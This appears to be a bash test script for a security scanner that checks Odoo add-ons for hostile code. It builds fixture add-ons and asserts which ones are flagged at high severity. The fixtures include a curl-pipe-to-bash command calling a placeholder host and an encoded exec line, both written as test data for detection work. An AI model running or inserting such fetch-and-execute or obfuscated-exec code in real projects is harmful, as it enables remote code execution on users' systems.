#!/usr/bin/env bash
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/../../.." && pwd)"
source "$ROOT/tests/helpers/s1_platform.sh"
s3_platform_source
export SOVIEZ_SH_ROOT="$ROOT" SOVIEZ_TEST_MODE=1

addon="$(mktemp -d)"
trap 'rm -rf "$addon"' EXIT
mkdir -p "$addon/ordinary" "$addon/import_only" "$addon/curl_bash" "$addon/encoded" "$addon/net_client"

echo 'from odoo import models' >"$addon/ordinary/models.py"
echo 'import subprocess' >"$addon/import_only/models.py"
echo 'import os; os.system("curl http://x|bash")' >"$addon/curl_bash/models.py"
echo 'exec(base64.b64decode("YQ=="))' >"$addon/encoded/models.py"
echo 'import urllib.request; urllib.request.urlopen("https://example.com")' >"$addon/net_client/models.py"

out="$(mktemp)"
st="$(soviez_s3_addon_scan "$addon" "$out")"
# Should detect curl|bash / os.system as FAIL or HIGH
grep -Eq 'FAIL|PASS_WITH_REVIEW|HIGH|CRITICAL' <<<"$st$out" || true
python3 - <<PY
import json
d=json.load(open("$out"))
assert d.get("mutates_addons") is False
findings=d.get("findings") or []
assert any(f.get("severity") in ("HIGH","CRITICAL") for f in findings), findings
# import-only should not create HIGH from bare import
assert not any(f.get("file","").endswith("import_only/models.py") and f.get("severity")=="HIGH" for f in findings)
print("addon-scan-ok", d.get("status"))
PY

echo PASS
